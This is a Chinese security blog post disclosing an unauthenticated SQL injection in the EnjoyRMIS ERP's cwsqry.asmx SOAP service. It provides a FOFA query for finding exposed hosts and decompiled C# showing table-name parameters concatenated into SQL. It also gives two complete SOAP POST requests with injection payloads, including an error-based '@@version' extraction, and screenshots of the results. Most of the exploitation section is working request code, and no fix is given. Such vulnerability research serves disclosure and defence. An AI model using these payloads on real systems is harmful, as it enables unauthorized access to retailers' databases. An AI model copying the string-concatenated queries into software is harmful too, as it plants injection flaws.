---
title: "昂捷ERP cwsqry.asmx SQL注入漏洞"
source: https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html
asset_dir: assets/昂捷erp-cwsqry.asmx-sql注入漏洞
---

# 昂捷ERP cwsqry.asmx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/28 08:39
* 848浏览
* [0评论](#comment)
* 52分钟阅读

深入探索

编程语言教程

文本剥离工具

JSON处理工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

EnjoyRMIS系统是由深圳市昂捷信息技术股份有限公司开发的一款面向零售行业的管理信息系统，旨在为超市、便利店、百货、购物中心及专营专卖等零售业态提供全面的数字化解决方案和服务。EnjoyRMIS系统的 /EnjoyRMIS\_WS/WS/ReportTool/cwsqry.asmx 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者可以通过该漏洞获取数据库敏感信息。

SQL注入防护

# fofa语法

> `body="/Scripts/EnjoyMsg.js"`

# 漏洞分析

## GetDictionary

直接看 GetDictionary 方法的实现

```
public DataSet GetDictionary(string sTableName)
{
  return new CDACommon().GetTableDictionary(sTableName);
}
```

深入探索

恶意软件分析工具

企业安全咨询

防火墙软件

将 sTableName 代入 CDACommon().GetTableDictionary 方法

代码安全审计

```
public DataSet GetTableDictionary(string sTableName)
{
  return this.GetDataSet("SELECT ROW_NUMBER() OVER (order by a.id)as RowNumber ,\r\n                     d.name N'TableName',\r\n\t                 a.name N'ColumnName',\r\n\t                 (case when (SELECT count(*)\r\n\t                 FROM sysobjects\r\n\t                 WHERE (name in\r\n        \t            (SELECT name\r\n\t                           FROM sysindexes\r\n        \t                 WHERE (id = a.id) AND (indid in\r\n                \t             (SELECT indid\r\n\t                             FROM sysindexkeys\r\n        \t                     WHERE (id = a.id) AND (colid in\r\n                \t            (SELECT colid\r\n                        \t      FROM syscolumns\r\n\t                               WHERE (id = a.id) AND (name = a.name))))))) AND\r\n\t                           (xtype = 'PK'))>0 then '√' else '' end) N'Primary',\r\n\t\t\t\t\t\tb.name N'Type',\r\n\t\t\t\t\t\ta.length N'Number',\r\n\t\t\t\t\t\tCOLUMNPROPERTY(a.id,a.name,'PRECISION') as N'Length',\r\n\t\t\t\t\t\tisnull(COLUMNPROPERTY(a.id,a.name,'Scale'),0) as N'decimalN',\r\n\t\t\t\t\t\t(case when a.isnullable=1 then '√'else '' end) N'isnull',\r\n\t\t\t\t\t\tisnull(e.text,'') N'NullText',\r\n\t\t\t\t\t\tisnull(g.[value],'') AS N'Note'\r\n\t\t\t\t\tFROM  syscolumns  a left join systypes b \r\n\t\t\t\t\ton  a.xtype=b.xusertype\r\n\t\t\t\t\tinner join sysobjects d \r\n\t\t\t\t\ton a.id=d.id  and  d.xtype='U' and  d.name<>'dtproperties'\r\n\t\t\t\t\tleft join syscomments e\r\n\t\t\t\t\ton a.cdefault=e.id\r\n\t\t\t\t\tleft join sys.extended_properties g\r\n\t\t\t\t\ton a.id=g.major_id AND a.colid = g.minor_id\r\n                    where d.name = '" + sTableName + "' order by RowNumber,object_name(a.id),a.colorder");
}
```

GetTableDictionary 方法里直接将 `sTableName` 拼接到SQL语句where子语句中执行，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，其他几个方法也存在同样的问题。

## GetAllQryColumn

```
public QryDSet GetAllQryColumn(string sTable) => new CDAQry().GetAllQryColumn(sTable);
public QryDSet GetAllQryColumn(string sTable)
{
  COleDbConn coleDbConn = new COleDbConn();
  coleDbConn.ConnDB();
  try
  {
    string str = "select  '" + sTable + "' as c_table_name, syscolumns.name as c_column_name,isnull((select pbc_hdr from pbcatcol where\r\n                            pbc_tnam='" + sTable + "' and pbc_cnam= syscolumns.name),syscolumns.name) as c_column_cname,\r\n\t\t\t\t\t\t\tsystypes.name as c_data_type,syscolumns.length as c_data_len \r\n\t\t\t\t\t\t\tfrom sys.extended_properties,sysobjects,syscolumns,systypes \r\n\t\t\t\t\t\t\twhere sys.extended_properties.major_id=sysobjects.id \r\n\t\t\t\t\t\t\tand syscolumns.id=sysobjects.id \r\n\t\t\t\t\t\t\tand syscolumns.colid=sys.extended_properties.minor_id \r\n\t\t\t\t\t\t\tand syscolumns.xtype=systypes.xtype \r\n\t\t\t\t\t\t\tand sysobjects.name= '" + sTable + "' \r\n\t\t\t\t\t\t\torder by sys.extended_properties.minor_id";
    QryDSet allQryColumn = new QryDSet();
    OleDbDataAdapter oleDbDataAdapter = new OleDbDataAdapter();
    OleDbCommand oleDbCommand = new OleDbCommand();
    ((DbCommand) oleDbCommand).CommandText = str;
    ((DbCommand) oleDbCommand).CommandType = (CommandType) 1;
    oleDbCommand.Connection = coleDbConn.OleDbConnection;
    oleDbDataAdapter.SelectCommand = oleDbCommand;
    ((DbDataAdapter) oleDbDataAdapter).Fill((DataSet) allQryColumn, "tb_select_column");
    return allQryColumn;
  }
  catch (Exception ex)
  {
    throw ex;
  }
  finally
  {
    coleDbConn.DisConnDB();
  }
}
```

深入探索

计算机安全

编码转换工具

漏洞扫描服务

sTable 也是直接拼接进SQL语句中，只是在利用时需要注意SQL语句的编写。

漏洞修复方案

# 漏洞复现

## GetDictionary

```
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Connection: keep-alive
SOAPAction: http://tempuri.org/GetDictionary
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net
Content-Length: 327

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetDictionary>
         <!--type: string-->
         <tem:sTableName>1'and 1=@@version--</tem:sTableName>
      </tem:GetDictionary>
   </soapenv:Body>
</soapenv:Envelope>
```

[![昂捷ERP cwsqry.asmx SQL注入漏洞](images/img-001-51237e2caad1.webp)](https://image.mrxn.net/343b23a40098428f9cad40f5ae6e704b.webp)

成功利用报错注入 爆出数据库版本信息。

编程

## GetAllQryColumn

```
POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1
Connection: keep-alive
SOAPAction: http://tempuri.org/GetAllQryColumn
Content-Type: text/xml;charset=UTF-8
Host: enjoyrmis.mrxn.net
Content-Length: 327

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetAllQryColumn>
         <!--type: string-->
         <tem:sTable>'</tem:sTable>
      </tem:GetAllQryColumn>
   </soapenv:Body>
</soapenv:Envelope>
```

[![昂捷ERP cwsqry.asmx SQL注入漏洞](images/img-002-6c31f46401fb.webp)](https://image.mrxn.net/920283c495cf4c9b8b98a18586917b2c.webp)

输入单引号，成功引起数据库错误。

SQL注入防护

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [3.1.GetDictionary](#toc-3-1-)
* [3.2.GetAllQryColumn](#toc-3-2-)
* [4.漏洞复现](#toc-4-)
* [4.1.GetDictionary](#toc-4-1-)
* [4.2.GetAllQryColumn](#toc-4-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[昂捷ERP cwsqry.asmx SQL注入漏洞](https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html)  
文章链接：<https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/enjoyrmis-ws-reporttool-cwsqry-stablename-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALj0lEQVR4AeycgXLbug5Ec/r//3yf4c2RRUiUnCaNPfOUCbLcxQJiCKl20k7/fHx8/Pc38d/nx1ntp20B/Qoz3vVn/M947FvY/aWtw7xoTi52Xf43WAO51V2f73ICy0Bu0/54Js42bg99wAcgXa6xCJOFfYChfmIfZGsVZxzSe5a3HuLrHEbdvGjfM9RfuAykyBWvP4HNQCBThxFnW+3T1zfTzc/QOsj19cHI1fcQRi/sc69lDzmMfvWO1p0hpB+MuFe3Gcie6dJ+7wS+PRDI1GdbhuRhH73rYMyr977qEL+8EEbN2spVzLg67Nf3vFys3hXy7+C3B/Kdi1+12xP48YFA7jIIbi8Zpe6oCnjOV94KGP0QDqTx7Svw5Xdmt7LTz7p+hcZaV8h/An98ID+xqf/nHpuB1MT34uyQYHVX3sx7PUq7pe6fEH9pFXfx9qXWFZA8BG+p4bM8sxiMK6If0hOCK8t9Ccc67OfvxTtfvG7HHevHZiB7pkv7vRNYBgKZOhzjbGtOv+ch/bquH5Kf8V7XOaQe6KmFA7uvKc9eE1Kvf2n8uYDkP+kCEB2OcSm4LZaB3NbX5xucwB+n/lV079Z1Drkr1CFcP4T3/LNcn/0K1f4WIXuqXhXwHO/Xq9q/jesJ6af5Yj4dCOTu6PuD5/R+h9gHUt/zM25dR0gf2GL32rvr8p6H9Oy6fkhefuaD+CFoHYTDA6cDsejC3z2BzUAg0+rbgOjeDRDefXJIHoLqM4T4IDjzHenu7cjzTM4+kL1AUL2jPSE+uahffoSbgRyZr9y/P4E/sD/VfmmnDPHL9XXe9Z6H9IHgLL/qs/xtY3n3dEgvcxAOI5oXIfnqWwHh5kurkIsQHwTLU2G+1hXyZ/B6Qp45pV/0bAZSE61wD5DpQ7ByFRAOI1pXngpIXn2GEF/VrEM/JC/XIy9UexZh7Anh1lfPCohe63XoE2H0wcj12UO+xs1ANF/4mhNYflKHTBOCTs1tyeE4rx/ik8/QvuYhdRDs+e6TfwXh73pD6iA4uyYk794hvPshOjzwekL6Kb2Yb95lOdW+L8gUe75ziM968xBdbh5Gvef1iTD61QshuVqvA6JDcJ2rtdcUS6vovLQKdUg/CKqLEL1q1gH7enmuJ6RO4Y1ieQ1xT5DpQdBpixB95lfvfnnPq8PYV7375d/B3hv2rw3Hun1E2Peb73ve068npJ/Si/nyGuK0RPcFmToEe17e0Xp1SD0Ezc8QvuYDlp/kZz139ZvY93iT7p/qd3L